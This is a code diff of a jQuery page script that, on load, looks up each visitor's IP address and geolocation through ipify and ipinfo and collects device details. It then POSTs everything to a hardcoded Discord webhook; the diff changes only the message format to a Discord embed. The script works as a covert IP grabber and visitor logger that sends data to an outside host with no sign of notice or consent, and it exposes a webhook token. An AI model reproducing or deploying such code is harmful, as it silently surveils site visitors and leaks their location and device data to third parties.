@@ -31,31 +31,91 @@ $(document).ready(function () {
   $.get("https://api.ipify.org?format=json", function (data) {  
    $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {  
     getDeviceDetails().then(function (deviceDetails) {  
-      var message = 'IP Address: ' + data.ip + '\n'  
-              + 'Country: ' + ipData.country + '\n'  
-              + 'Region: ' + ipData.region + '\n'  
-              + 'City: ' + ipData.city + '\n'  
-              + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected') + '\n'  
-              + 'Device Details:\n'  
-              + 'User Agent: ' + deviceDetails.userAgent + '\n'  
-              + 'Platform: ' + deviceDetails.platform + '\n'  
-              + 'Language: ' + deviceDetails.language + '\n'  
-              + 'Screen Width: ' + deviceDetails.screenWidth + '\n'  
-              + 'Screen Height: ' + deviceDetails.screenHeight + '\n'  
-              + 'Color Depth: ' + deviceDetails.colorDepth + '\n'  
-              + 'Pixel Depth: ' + deviceDetails.pixelDepth + '\n'  
-              + 'Online: ' + deviceDetails.online + '\n'  
-              + 'Is Mobile: ' + deviceDetails.isMobile + '\n'  
-              + 'Is Touch Device: ' + deviceDetails.isTouchDevice;  
+      const embed = {  
+       title: "Device Information",  
+       description: "IP Address: " + data.ip,  
+       fields: [  
+        {  
+          name: "Country",  
+          value: ipData.country,  
+          inline: true  
+        },  
+        {  
+          name: "Region",  
+          value: ipData.region,  
+          inline: true  
+        },  
+        {  
+          name: "City",  
+          value: ipData.city,  
+          inline: true  
+        },  
+        {  
+          name: "VPN",  
+          value: ipData.usingVPN === true ? "Detected" : "Not Detected",  
+          inline: true  
+        },  
+        {  
+          name: "User Agent",  
+          value: deviceDetails.userAgent,  
+          inline: false  
+        },  
+        {  
+          name: "Platform",  
+          value: deviceDetails.platform,  
+          inline: true  
+        },  
+        {  
+          name: "Language",  
+          value: deviceDetails.language,  
+          inline: true  
+        },  
+        {  
+          name: "Screen Width",  
+          value: deviceDetails.screenWidth,  
+          inline: true  
+        },  
+        {  
+          name: "Screen Height",  
+          value: deviceDetails.screenHeight,  
+          inline: true  
+        },  
+        {  
+          name: "Color Depth",  
+          value: deviceDetails.colorDepth,  
+          inline: true  
+        },  
+        {  
+          name: "Pixel Depth",  
+          value: deviceDetails.pixelDepth,  
+          inline: true  
+        },  
+        {  
+          name: "Online",  
+          value: deviceDetails.online,  
+          inline: true  
+        },  
+        {  
+          name: "Is Mobile",  
+          value: deviceDetails.isMobile,  
+          inline: true  
+        },  
+        {  
+          name: "Is Touch Device",  
+          value: deviceDetails.isTouchDevice,  
+          inline: true  
+        }  
+       ]  
+      };  
   
       $.ajax({  
        url:  "https://discord.com/api/webhooks/1290539045935517707/Y-3_x6_HtrRGrh4sCmAiUjrh3NCgXwS2vNsl0VAx8ij76inM30SrmDO9x_o4wXanrGuq",  
        type: 'POST',  
-       data: JSON.stringify({ content: message }),  
+       data: JSON.stringify({ embeds: [embed] }),  
        contentType: 'application/json'  
       });  
     });  
    });  
   });  
 });
-          
+         
